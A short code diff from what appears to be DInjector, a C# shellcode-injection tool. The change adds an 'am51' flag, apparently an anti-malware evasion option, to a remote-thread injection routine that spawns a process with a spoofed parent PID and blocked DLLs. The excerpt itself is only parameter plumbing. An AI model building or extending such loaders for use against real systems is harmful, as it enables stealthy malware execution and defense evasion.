@@ -9,7 +9,7 @@ namespace DInjector
 {
     class RemoteThreadKernelCB
     {
-        public static void Execute(byte[] shellcode, string processImage, int ppid = 0, bool blockDlls = false)
+        public static void Execute(byte[] shellcode, string processImage, int ppid = 0, bool blockDlls = false, bool am51 = false)
         {
             #region CreateProcessA
 
@@ -18,7 +18,8 @@ namespace DInjector
                 @"C:\Windows\System32",
                 suspended: false,
                 ppid: ppid,
-                blockDlls: blockDlls);
+                blockDlls: blockDlls,
+                am51: am51);
 
             IntPtr hProcess = pi.hProcess;
             _ = Win32.WaitForInputIdle(hProcess, 2000);
